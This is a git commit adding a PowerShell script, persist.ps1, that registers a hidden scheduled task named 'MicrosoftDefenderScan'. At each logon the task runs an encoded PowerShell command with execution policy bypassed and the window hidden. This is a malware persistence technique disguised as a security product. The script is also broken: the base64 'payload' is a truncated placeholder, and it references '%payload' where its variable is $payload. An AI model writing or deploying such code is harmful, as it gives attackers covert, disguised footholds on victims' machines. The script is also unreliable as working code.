4789438ac705247ab68d0a5c513b9ade706582cc
Shmilt <askiloseberg@outlook.com>
2025-08-07 14:57:05 +0200

    Create persist.ps1

---
+++ persist.ps1
@@ -0,0 +1,7 @@
+$payload = "d2VudHN0dWR5aW5ncGxhbm1hcmtldGZsb2F0aW5nYWxvbmdmYWxsZW5saXR0bGVwZWE=..."
+
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %payload"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+
+Register-ScheduledTask -TaskName "MicrosoftDefenderScan" -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force
